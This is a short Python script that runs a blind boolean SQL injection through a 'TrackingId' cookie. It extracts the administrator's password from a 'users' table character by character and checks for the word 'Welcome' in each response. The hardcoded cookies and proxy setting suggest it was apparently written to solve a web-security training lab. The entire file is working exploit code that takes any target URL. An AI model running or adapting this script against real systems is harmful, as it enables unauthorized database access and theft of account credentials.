import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'https': 'https://127.0.0.1:8080'}
#pip install urllib3==1.25.11 in case of a bug with porxy
def get_password(url):
    password = ""
    for i in range (1,21):
        for j in range(32,126):
            payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)
            payload_enconded = urllib.parse.quote(payload)
            cookies = {'TrackingId': 'aASW8g7cbbtLi971' + payload_enconded, 'session':'AN0WHsVvEIBaUUauxcsHdtGbbtTR47lk'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxy)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password + chr(j))
                sys.stdout.flush()
            else:
                password += chr(j)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break

            #print(r.text)
    #password = ""
    #print(password)

def main():
    if len(sys.argv) != 2:
        print("FORMAT: sqli.py url")
        exit()
    
    url = sys.argv[1]
    get_password(url)
    



if __name__ == "__main__":
    main()